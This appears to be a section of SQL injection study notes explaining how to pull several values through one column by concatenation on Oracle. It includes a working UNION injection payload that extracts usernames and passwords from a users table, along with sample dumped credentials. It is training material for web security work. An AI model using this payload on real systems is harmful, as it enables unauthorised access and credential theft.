# 11. Retrieving multiple values within a single column

### 📄 Scenario

In some cases, the query in the previous example may return **only a single column**.

---

### 🧩 Solution: Concatenate Values

You can retrieve **multiple values** together within this single column by **concatenating** them.

Using a **separator** helps distinguish the combined values.

---

### 🧪 Example (Oracle):

You can submit the input:

```sql
' UNION SELECT username || '~' || password FROM users--
```

- `||` is the **string concatenation operator** on Oracle.
- The values of `username` and `password` are joined using the `~` separator.

---

### 📋 Sample Output:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

---

### 🔄 Note on Database Differences

Different databases use **different syntax** for string concatenation.

👉 For more details, refer to the:

> 📚 SQL injection cheat sheet
>